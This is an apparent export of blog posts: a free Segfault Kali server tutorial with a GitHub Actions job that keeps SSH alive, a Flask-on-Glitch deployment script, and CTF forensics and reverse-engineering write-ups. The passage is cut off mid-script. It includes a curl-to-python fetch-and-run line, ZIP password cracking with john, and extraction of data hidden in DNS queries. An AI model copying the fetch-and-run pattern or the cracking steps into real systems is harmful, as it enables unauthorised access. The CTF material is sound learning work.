[{"content":"Original Article in Medium: https://sondt1337.medium.com/kali-linux-vps-for-free-it-appears-so-segfault-tutorial-6c9dd0642ff0\nSegfault, created by The Hacker’s Choice, is a complimentary application for Cyber Security Researcher. It provides an unlimited server with Root access. With each new server that is generated, SSH connection is established for communal use.\nLOGIN Server To connect to Segfault via SSH, use the following command:\n1 ssh root@segfault.net # The password is \u0026#39;segfault\u0026#39; When initially connecting to Segfault to open a root and SSH server, a 60-second wait is required. However, this duration is not typical for subsequent connections (probably less).\nOnce successfully connected to the server, it will provide details such as SSH and IP address. (It’s important to save this information for future reference.)\nLater, to log in again, simply execute the SSH command provided below.\n1 ssh -o \u0026#34;SetEnv SECRET=YOUR_KEY_PRIVATE\u0026#34; root@lulz.segfault.net Once logged in, this Kali server can be utilized as a virtual machine equipped with a comprehensive suite of tools for security and networking, … (Segfault’s homepage for more details).\nTo log out of the server, simply use the exit command.\nTUNNEL Server - Argo Tunnel (Cloudflare Tunnel) Although the server we have is nearly identical to a real Kali Linux virtual machine, it can initiate connections from the inside, but external connections cannot reach it using common protocols like HTTP, TCP, etc. For this, I will need to utilize a powerful Cloudflare feature called Tunnel.\nInitially, you must establish a tunnel from Cloudflare to the Kali Linux server using Zero Trust.\nCreate a tunnel Name your tunnel Install and run connectors In the “Choose your environment” options, select Debian — 64-bit.\n1 2 3 4 5 curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb sudo dpkg -i cloudflared.deb sudo cloudflared service install \u0026#34;YOUR_TOKEN_CLOUDFLARE\u0026#34; # Replace YOUR_TOKEN_CLOUDFLARE Upon a successful connection, Connectors will display both ID and Status.\nRoute Traffic In “Route Traffic,” you must fill in the Domain (at least one domain is required) and the method + URL (localhost).\nUse http.server in background to tunnel from machine to cloudflare.\nWhen the http.server is running in the background, a Cloudflare tunnel can be configured to a domain, allowing access via: https://segfault.sondt.id.vn\n(If you’re still able to access this page, it indicates that the article remains accurate. LOL)\nYou can create an HTML file in the background to display a welcome page :\u0026gt;\nUPTIME Server However, if the requirement is to establish a connection that remains active indefinitely, allowing applications to run continuously, what should be done?\nAccording to the segfault announcement, the server will remain up as long as you are logged into the Segfault. This means your progress will be preserved as long as you maintain an SSH connection to segfault.net.\nSo we need to make something that can automatically connect “ssh” to the segfault server.\nGithub Actions GitHub Actions is a complimentary service offered by GitHub that facilitates the automation of the CI/CD process. It enables users to create workflows that automate tasks within the software development lifecycle.\nWhen you create a repository in Github, you can choose Actions to start Github Actions, choose the simple workflow.\nI have created a YAML script to automate the process of repeatedly establishing an SSH connection with a set interval.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 name: SEGFAULT on: push: branches: [main] pull_request: branches: [main] schedule: - cron: \u0026#39;*/20 * * * *\u0026#39; # Restart each 20 minutes jobs: build: runs-on: ubuntu-latest steps: - name: Checkout code uses: actions/checkout@v4 - name: Install sshpass run: sudo apt-get install -y sshpass - name: Connect to SSH and run command # automatic connect ssh from github actions run: | sshpass -p \u0026#34;segfault\u0026#34; ssh -o \u0026#34;SetEnv SECRET=YOUR_KEY\u0026#34; -o \u0026#34;StrictHostKeyChecking=no\u0026#34; root@lulz.segfault.net \u0026#34;ls\u0026#34; This rules will make automatically connect to SSH every 20 minutes, making the SSH connection process uninterrupted for too long.\nWe have successfully established a continuous SSH connection to the server, ensuring it remains active for our needs.\nCONCLUSION This article demonstrates how to establish a connection to a Segfault, create a tunnel from the Segfault server to an external destination with domain, and maintain it with 100% uptime.\nIf you find this guide helpful, please consider sharing it with your friends.\nThank you for visting!\nBuy me a coffee ☕: https://www.buymeacoffee.com/spid3r\n","date":"2024-04-30T00:00:00Z","image":"/p/kali-linux-vps-for-free-a-segfault-tutorial-that-makes-it-possible/featured_hu27284f875c3d9d81c0ece0963df46d0e_36612_120x120_fill_box_smart1_3.png","permalink":"/p/kali-linux-vps-for-free-a-segfault-tutorial-that-makes-it-possible/","title":"Kali Linux VPS for Free: A Segfault Tutorial That Makes It Possible"},{"content":"Overview (Flask) Perhaps everyone is familiar with Flask, a framework from Python. Flask depends on the Werkzeug WSGI toolkit, the Jinja sample engine,\u0026hellip; to build BE \u0026amp; FE application.\nStructure 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 my_flask_project/ │ ├── app.py ├── templates/ │ ├── index.html │ ├── ... │ ├── static/ │ ├── css/ │ │ ├── style.css │ │ ├── ... │ │ │ ├── js/ │ │ ├── script.js │ │ ├── ... │ │ │ ├── img/ │ ├── logo.png │ ├── ... │ ├── models/ │ ├── user.py │ ├── ... │ ├── routes/ │ ├── user_routes.py │ ├── auth_routes.py │ ├── ... │ └── config.py app.py: This is the main entry point of your Flask application where you create an instance of the Flask class and define routes and views.\ntemplates/: This directory contains HTML templates used for rendering dynamic content using the Jinja2 templating engine. Each template file represents a different page or component of your web application.\nstatic/: This directory is used for storing static files such as CSS stylesheets, JavaScript files, images, etc. These files are served directly to the client without any processing by Flask.\nmodels/: If your application involves working with databases or data models, you can create a directory to store your database models or data access code.\nroutes/: It\u0026rsquo;s common practice to organize your route handlers into separate files within a directory. For example, you might have a user_routes.py file for handling user-related routes, an auth_routes.py file for authentication routes, etc.\nconfig.py: This file contains configuration settings for your Flask application such as database connection strings, secret keys, etc. Separating configuration from your main application logic helps in keeping your code modular and maintainable.\nrequirements.txt: This file lists all the Python dependencies required by your Flask application. You can generate this file using pip freeze \u0026gt; requirements.txt after installing all necessary packages.\nBuild To build a Flask project, follow these steps:\nYou need to install flask by adding flask into requirements.txt\nCreate a directory for your project, navigate into it, then install lib \u0026amp; run flask project:\n1 2 3 4 mkdir my_flask_project cd my_flask_project pip install -r requirements.txt python app.py Open a web browser and navigate to http://localhost:5000 to see your Flask application in action.\nAs you develop your application, continue to iterate on your codebase, adding features, fixing bugs, and refining your project structure as needed.\nBut the main purpose of the article is about how to build and run a flask project on glitch, everything will be available in the following link for reference: https://www.geeksforgeeks.org/flask-tutorial/\nAbout Glitch Glitch is an application that allows developers to build projects publicly, supported from static web creation, front-end projects with Angular/React, or full-stack web with NodeJS.\nIf you\u0026rsquo;re a new user, figuring out how to implement a Flask project on Glitch might seem like a daunting task, especially since it\u0026rsquo;s not available as an option. This article aims to provide you with step-by-step instructions on how to do this.\nBuild \u0026amp; Deploy Flask on Glitch Create a New Project Visit Glitch.com and sign in or sign up for an account. Once logged in, click on \u0026ldquo;New Project\u0026rdquo; to create a new project.\nHere, our focus will be on preparing the environment for the project. Select glitch-hello-website to proceed.\nStructure of project After selecting glitch-hello-website for the project, we now need to adjust the initial project structure to resemble that of a Flask project (here).\nWriting the Flask Application In app.py file, import Flask and create an instance of the Flask class. Define routes to handle different URLs and their corresponding functionality using route decorators. For example:\n1 2 3 4 5 6 7 8 9 10 from flask import Flask, render_template app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return render_template(\u0026#39;index.html\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) Creating Templates Create HTML templates for different pages of this website inside a folder named templates. Flask uses Jinja2 templating engine, which allows us to inject Python code into your HTML templates. For example, create a file named index.html inside the templates folder:\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Home Page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to My Website!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This is the home page.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Select the Terminal section at the bottom of the glitch page to switch to command processing. You can then run this project using the following commands:\n1 2 pip install -r requirements.txt python app.py You can view the process of your project:\nSo, as of now, we can build a project using Flask on Glitch. How can we set it up to automatically deploy when we turn it off and access it again?\nAutomatically deploy Flask Environment Variables The .env file is for storing secrets for your app, like an API key. Any project member can see the contents in the same way that you can, and everyone else can just see the variable names.\n1 2 GLITCH_DEBUGGER=true # Scrubbed by Glitch 2024-03-27T17:24:18+0000 SH File An SH file is a script programmed for bash, a type of Unix shell (Bourne-Again Shell). It contains instructions written in the Bash language and can be executed by typing text commands within the shell\u0026rsquo;s command-line interface.\nBcuz this mode of Glitch does not support Flask, we need to create an alternative, which is a virtual environment for Python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #!/bin/bash set -eu export PYTHONUNBUFFERED=true VIRTUALENV=.data/venv if [ ! -d $VIRTUALENV ]; then python3 -m venv $VIRTUALENV fi if [ ! -f $VIRTUALENV/bin/pip ]; then source $VIRTUALENV/bin/activate curl --silent --show-error --retry 5 https://bootstrap.pypa.io/get-pip.py | python deactivate fi $VIRTUALENV/bin/pip3 install -r requirements.txt $VIRTUALENV/bin/python3 app.py Detail:\n#!/bin/bash is called a shebang and specifies that the script should be executed using /bin/bash. set -eu: This line is to ensure that the script will stop immediately if there is an error (-e) or variable is not defined (-u). This helps protect the program from unwanted errors. export PYTHONUNBUFFERED=true: Set the PYTHONUNBUFFERED environment variable so that Python does not buffer the output data. This can be useful in debugging or when running in a non-terminal environment. VIRTUALENV=.data/venv: Define the variable VIRTUALENV as the path to the virtual environment, in this code: .data/venv The if condition create a virtual directory \u0026amp; install pip The last 2 commands will install the lib in the requirements.txt and deploy flask with python app.py With python version 2.x, you can use this sh file\nConclusion By following the aforementioned steps, you can effortlessly develop and deploy a Flask application on Glitch. If you find this guide helpful, please consider sharing it with your friends.\nBuy me a coffee ☕: https://www.buymeacoffee.com/spid3r\nThank you for visting!\n","date":"2024-03-27T00:00:00Z","image":"/p/how-to-build-deploy-flask-project-on-glitch/featured_hu51661e0f756b9d3138ea612a8422b121_38058_120x120_fill_box_smart1_3.png","permalink":"/p/how-to-build-deploy-flask-project-on-glitch/","title":"How to build \u0026 deploy Flask project on Glitch?"},{"content":"Nói thật thì đây là 1 giải khá khó chịu với mình, vì ngoài độ guessing của các thử thách (forensics, mobile) thì thật ra chẳng có gì để nói cả (và rất tiếc với 1 mình mình làm thì không thể giải quyết được toàn bộ cùng 1 lúc)\nLost Puppey Description: This is my lost puppey. He is trying to hide himself and hide something from me. Can you find them for me?\nAttachment: Lost.docx\nĐề bài cho mình 1 file docx, dựa vào đề bài để tìm xem thứ gì bị ẩn giấu thì với kinh nghiệm mình sẽ unzip nó ra\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ┌──(root㉿kali)-[/home/kali/Desktop/cstv] └─# unzip Lost.docx Archive: Lost.docx inflating: [Content_Types].xml inflating: _rels/.rels inflating: word/_rels/document.xml.rels inflating: word/document.xml extracting: word/media/image1.jpg extracting: word/media/image2.jpg inflating: word/theme/theme1.xml inflating: word/settings.xml inflating: docProps/core.xml inflating: docProps/app.xml inflating: word/webSettings.xml inflating: word/styles.xml inflating: word/fontTable.xml Ở đây để ý rằng có 2 file media trong thư mục word/media/\nCó vẻ như image1.jpg đang bị corrupt, mình sẽ kiểm tra các byte và header xem có vấn đề gì không\n1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# xxd image1.jpg 00000000: 504b 0304 1400 0900 0800 d922 0955 4ac4 PK.........\u0026#34;.UJ. 00000010: 894f 8fde 0200 59e1 0200 0800 1c00 7465 .O....Y.......te 00000020: 7374 2e6a 7067 5554 0900 035a 19f2 620f st.jpgUT...Z..b. 00000030: 1af2 6275 780b 0001 04e8 0300 0004 e803 ..bux........... 00000040: 0000 413d 3e5e 82e4 e725 28b6 3da2 ab50 ..A=\u0026gt;^...%(.=..P 00000050: f6e0 2ad2 47c4 a8af 7599 2983 861a 5c2e ..*.G...u.)...\\. 00000060: 7ec5 636d 2019 9865 db00 2663 779f afff ~.cm ..e..\u0026amp;cw... 00000070: 18a2 0efe 5ef0 ab03 f443 dd7d 84a4 ba16 ....^....C.}.... 00000080: d23d b327 64b3 6c03 7be3 d7e3 77b2 7d38 .=.\u0026#39;d.l.{...w.}8 Yah, vậy nó thực chất là 1 file ZIP, đến đây cần giải nén nó ra nhưng xuất hiện thêm 1 vấn đề mới: password của file ZIP, với độ lỏ này thì chạy tools zip2john chắc là được rồi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# zip2john image1.zip \u0026gt; hash.txt Created directory: /root/.john ver 2.0 efh 5455 efh 7875 image1.zip/test.jpg PKZIP Encr: TS_chk, cmplen=188047, decmplen=188761, crc=4F89C44A ts=22D9 cs=22d9 type=8 ┌──(root㉿kali)-[/home/…/Desktop/cstv/word/media] └─# john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst loveyou (image1.zip/test.jpg) 1g 0:00:00:00 DONE 2/3 (2024-01-06 18:19) 33.33g/s 1587Kp/s 1587Kc/s 1587KC/s 123456..ferrises Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Vậy mật khẩu file ZIP này là loveyou sau khi giải nén ra thì được cái ảnh test.png\nVới JPG thì mình không nghĩ nhiều cho lắm, ném lên Aperi\u0026rsquo;Solve cho tự xử lý nốt\nflag: hackathon{bbc649da49b02570835df50fd173bff7d4933f07}\nWhose name is it? Description: I fell like there are many people drawing my secret\u0026hellip;\nAttachment: capture.pcap\nỞ chall thứ 2 thì có vẻ đúng hơn 1 chút với cái nghĩa forensics \u0026hellip;\nSau khi check các object xuất hiện trong lưu lượng mạng thì thấy có 1 file thực thi (mình đã rev nó + decompile thử) nhưng mà không có gì để \u0026ldquo;khai thác\u0026rdquo; nên chuyển hướng qua phương án khác\nTrong quá trình tìm kiếm thì mình có thấy trong udp stream xuất hiện việc gửi nhận 1 txt nào đó khá khả nghi\nBắt thử 1 query trong đó và decode thử theo thói quen thì thấy rằng đây là header của 1 file ZIP, thấy có hope nên theo hướng này luôn\nVậy việc của mình bây giờ chỉ là filter toàn bộ các udp.stream từ 188 đến 1569 (kết thúc) để filter với dns \u0026amp;\u0026amp; udp.stream \u0026gt;= 188 \u0026amp;\u0026amp; udp.stream \u0026lt;= 1569 và viết script để loại bỏ các phần thừa rồi ném qua cyberchef cho xử lý nốt\nscript:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import re pattern = re.compile(r\u0026#39;\\b(\\d+\\.\\d+[a-fA-F\\d]+)\\.\\w+\\.\\w+\\.\\w+\\b\u0026#39;) with open(\u0026#34;dnsfilter.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: input_text= f.read(); match = re.findall(pattern,input_text) with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as output_file: # Các queries trùng lặp 6 lần, loại bỏ bớt for m in range(0, len(match), 6): output_file.write(match[m].split(\u0026#39;.\u0026#39;)[1]) flag: CSTV_2023_{ba69f4c8c869295a9a8024b32a177bc63a942ffd}\nL4g Description: Can you deal with the lagging. If you can f the lag You will get the flag.\nAttachment: 3y3L4g \u0026amp; 34rL4g.wav\nỞ thử thách for cuối cùng này thì mình nhận được 2 file (1 wav và 1 file data), với kinh nghiệm thì mình xiên được file WAV đầu tiên bằng việc xem ảnh phổ của âm thanh\nNhìn qua thì thấy rằng đây là 1 đoạn mã Morse đơn giản \u0026ndash;\u0026gt; WH4TY0UH34R1SN0TWH4TY0US33KF0R, cái này chắc là để dùng sau vì còn 1 file mắt lag nữa (mình nghi là file ảnh)\nDựa vào header của file này thì đúng là các byte đã bị sửa và bản gốc là 1 file ảnh PNG, mình sẽ sửa lại header trước thành PNG\nNgoài ra thì còn 1 thứ khiến mình để ý nữa là 1HdR, khả năng là bị lỗi chunk (IHDR)\nỞ đây mình sử dụng tool: PNG-Fixer để kiểm tra các chunk có vấn đề\nVậy là từ đây thì biết được có 2 chunk bị sai là 1HdR và IPAD (IHDR và IDAT) tiến hành sửa lại toàn bộ (bằng HexEd)\nSau khi fix xong chunk thì sẽ chuyển qua [PCRT](để kiểm tra các tổng quan các byte)\nMình vừa mới fix lại cái IPAD xong nên bây giờ cần sửa lại IDAT chunk data length ở offset 0xD0002 (bằng HexEd)\nCứ vậy sửa lỗi tiếp đến bao giờ có thể nhìn được ảnh (bỏ qua bước sửa CRC chunk vì ảnh ban đầu đã lỗi sẵn)\nẢnh sau khi sửa xong: output.png\nMở trên Windows sẽ nhìn thấy luôn chứ không bị lỗi nữa, có thể đọc đoạn chữ trên ảnh là: Mắt hơi lag xin thông cảm và đoạn số là 123321232123\nĐến hiện tại thì cả 2 file mình đã khai thác được toàn bộ file ảnh (bao gồm cả metadata của ảnh nữa) vậy chỉ còn lại file wav là chưa thực sự khai thác hết, với đoạn key trên có lẽ là pass của việc dùng tool? bài này stegano nên chắc cũng chỉ được có thế (mình mất nhiều thời gian suy nghĩ đủ hướng chỉnh ảnh các kiểu \u0026hellip;)\n1 2 3 4 ┌──(root㉿kali)-[/home/kali/Downloads] └─# steghide extract -sf 34rL4g.wav Enter passphrase: wrote extracted data to \u0026#34;Br41nL4g.txt\u0026#34;. yah, xong lag mắt, lag tai giờ đến lag não, không biết troll gì nữa đây \u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 +++\u0026gt;-\u0026lt;+-.-+.+-+ ++++--+---+\u0026lt;.-+ +\u0026gt;++--+--.+.--+ +++.--+--\u0026lt;+\u0026gt;--+ ++++--+---+-.-. ++++--..-.+--.\u0026lt; ++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;. ++\u0026lt;+.--+-++--.. ++\u0026lt;++--+.++.-\u0026gt;. ++\u0026lt;++--.-+++-+. [\u0026gt;-.+--+-+++-+. \u0026gt;+]-+--+-+++-+. ++\u0026gt;-+--+-+++-+. \u0026gt;+\u0026gt;-+..+-+++-+. ++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+. Đến đây thì mình khá cạn lời rồi, vì brainfuck này không phải là nạp vào là ra mà phải lag tí não nữa mới được, chắc là cũng đọc theo chiều dọc giống như cái ảnh kia?\n1 2 3 4 5 6 x = \u0026#34;+++\u0026gt;-\u0026lt;+-.-+.+-+++++--+---+\u0026lt;.-++\u0026gt;++--+--.+.--++++.--+--\u0026lt;+\u0026gt;--+++++--+---+-.-.++++--..-.+--.\u0026lt;++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;.++\u0026lt;+.--+-++--..++\u0026lt;++--+.++.-\u0026gt;.++\u0026lt;++--.-+++-+.[\u0026gt;-.+--+-+++-+.\u0026gt;+]-+--+-+++-+.++\u0026gt;-+--+-+++-+.\u0026gt;+\u0026gt;-+..+-+++-+.++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+.\u0026#34; for j in range(15): for i in range(j, len(x), 15): print(x[i], end = \u0026#34;\u0026#34;) # ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.\u0026lt;------------.\u0026gt;+++++.\u0026lt;------.\u0026gt;-----..++.+++++.-------.--------.\u0026lt;-.\u0026gt;+++++++++++++++++++++++.\u0026lt;.\u0026gt;----.+++++++.--.---------------.\u0026lt;.\u0026gt;++++++++++.\u0026lt;......... yah got it, giờ chỉ cần chuyển nó qua sha1 rồi nộp flag thôi :3 (và đến cuối cùng thì cái mã morse trong file wav ban đầu chẳng để làm gì :3)\nflag: CSTV_2023_{1d7e89b852c2ef64283df637d0a36f16c3417f18}\n","date":"2024-01-06T00:00:00Z","image":"/p/cstv-capture-the-flag-2023-forensics/featured_hu2a81619bccf73120ad57fd6bcdb25d8d_52516_120x120_fill_box_smart1_3.png","permalink":"/p/cstv-capture-the-flag-2023-forensics/","title":"CSTV - CAPTURE THE FLAG 2023 | Forensics"},{"content":"In this CTF, I didn\u0026rsquo;t get a chance to do many rev challenges, partly because I had too many deadlines, and also partly because my old machine was breaking down.\nOpen Sesame Attachment: open_sesame.apk\nHere is an easy challenge apk. Use Decompiler.com to decompile this apk file then check sources/com/example/open_sesame/MainActivity.java to find main logic of this file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 package com.example.open_sesame; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.app.AppCompatDelegate; public class MainActivity extends AppCompatActivity { private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; private static final String valid_user = \u0026#34;Jack Ma\u0026#34;; private Button buttonLogin; private EditText editTextPassword; private EditText editTextUsername; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.editTextUsername = (EditText) findViewById(R.id.editTextUsername); this.editTextPassword = (EditText) findViewById(R.id.editTextPassword); Button button = (Button) findViewById(R.id.buttonLogin); this.buttonLogin = button; button.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { MainActivity.this.validateCredentials(); } }); } /* access modifiers changed from: private */ public void validateCredentials() { String trim = this.editTextUsername.getText().toString().trim(); String trim2 = this.editTextPassword.getText().toString().trim(); if (!trim.equals(valid_user) || !n4ut1lus(trim2)) { showToast(\u0026#34;Invalid credentials. Please try again.\u0026#34;); return; } \u0026#34;flag{\u0026#34; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34;) + \u0026#34;}\u0026#34;; } private boolean n4ut1lus(String str) { int[] it4chi = it4chi(str); if (it4chi.length != valid_password.length) { return false; } for (int i = 0; i \u0026lt; it4chi.length; i++) { if (it4chi[i] != valid_password[i]) { return false; } } return true; } private int[] it4chi(String str) { int[] iArr = new int[str.length()]; for (int i = 0; i \u0026lt; str.length(); i++) { iArr[i] = str.charAt(i); } return iArr; } private String sh4dy(String str) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str.length(); i++) { char charAt = str.charAt(i); if (Character.isDigit(charAt)) { sb.append(charAt); } } return sb.toString(); } private int sl4y3r(String str) { return Integer.parseInt(str) - 1; } private String flag(String str, String str2) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str2.length(); i++) { sb.append((char) (str2.charAt(i) ^ str.charAt(i % str.length()))); } return sb.toString(); } private void showToast(String str) { Toast.makeText(this, str, 0).show(); } } We should pay attention to some section:\n\u0026quot;flag{\u0026quot; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026quot;U|]rURuoU^PoR_FDMo@X]uBUg\u0026quot;) + \u0026quot;}\u0026quot;; valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; valid_user = \u0026quot;Jack Ma\u0026quot;; Here there are functions we need to pay attention to: it4chi, sh4dy, sl4y3r (each function has 1 different encoding, consisting only of simple calculations and xor operations) and valid_user \u0026amp; valid_password. Detail:\nit4chi get a string str as input and returns an array of integers sh4dy get a string str as input and returns a new string containing only the numeric characters from the original string sl4y3r get a string str as input, converts it to an integer using Integer.parseInt, subtracts 1 from the resulting value, and returns the result flag takes 2 strings and XOR char by char with length of shorter string Here\u0026rsquo;s my script to reverse this program to get the flag: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def get_flag(): valid_password = [52, 108, 49, 98, 97, 98, 97] valid_user = \u0026#34;Jack Ma\u0026#34; str2 = \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34; def it4chi(str): return [ord(c) for c in str] def sh4dy(str): return \u0026#39;\u0026#39;.join(c for c in str if c.isdigit()) def sl4y3r(str): return int(str) - 1 def flag(str, str2): return \u0026#39;\u0026#39;.join(chr(ord(str2[i]) ^ ord(str[i % len(str)])) for i in range(len(str2))) password = \u0026#39;\u0026#39;.join(chr(i) for i in valid_password) str1 = sh4dy(password) str_res = str1 str_res = str(sl4y3r(str_res)) return \u0026#34;flag{\u0026#34; + flag(str_res, str2) + \u0026#34;}\u0026#34; print(get_flag()) # flag{aLiBabA_and_forty_thiEveS} Secret Door Attachment:\nchall.out encoded.bin This is a C program written quite simply like to check the password and if correct, will decrypt the encoded file.bin to issue the flag image\ndump IDA (main function):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5; // [rsp+13h] [rbp-EDh] BYREF int v6; // [rsp+14h] [rbp-ECh] int *v7; // [rsp+18h] [rbp-E8h] char v8[32]; // [rsp+20h] [rbp-E0h] BYREF char v9[32]; // [rsp+40h] [rbp-C0h] BYREF char v10[32]; // [rsp+60h] [rbp-A0h] BYREF char v11[32]; // [rsp+80h] [rbp-80h] BYREF int v12[18]; // [rsp+A0h] [rbp-60h] unsigned __int64 v13; // [rsp+E8h] [rbp-18h] v13 = __readfsqword(0x28u); if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } v6 = 0; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v8); v12[0] = 66; v12[1] = 119; v12[2] = 101; v12[3] = 113; v12[4] = 123; v12[5] = 98; v12[6] = 114; v12[7] = 125; v12[8] = 119; v12[9] = 89; v12[10] = 115; v12[11] = 125; v12[12] = 111; v12[13] = 109; v12[14] = 62; v12[15] = 1; v12[16] = 0; while ( v6 \u0026lt;= 16 ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::push_back( v8, (unsigned int)(char)(LOBYTE(v12[v6]) ^ (v6 + 17))); ++v6; } std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9, \u0026#34;ThatsHardcoded!!!\u0026#34;, \u0026amp;v5); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v11, v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v10, v8); func_5(v10, v11); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v10); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v11); v7 = (int *)operator new[](0x44uLL); v3 = func_4(v8, argv[1]); v7 = (int *)func_3(v3, v9); if ( (unsigned __int8)func_2(v7) ) func_1(*v7, v7[16]); else std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Wrong door\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v8); return 0; } In this execute file, we must input 1 argv and length of argv is 17\n1 2 3 4 5 6 7 8 9 10 if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } In each iteration, v8 will append the value ((v12[i]) ^ (i + 17)) (i ascending) \u0026ndash;\u0026gt; v8 += chr((v12[i]) ^ (i + 17))\nwe can find v8:\n1 2 3 4 5 6 7 8 9 10 11 v6 = 0 v8 = \u0026#34;\u0026#34; v12 = [ 66, 119, 101, 113, 123, 98, 114, 125, 119, 89, 115, 125, 111, 109, 62, 1, 0 ] while v6 \u0026lt;= 16: v8 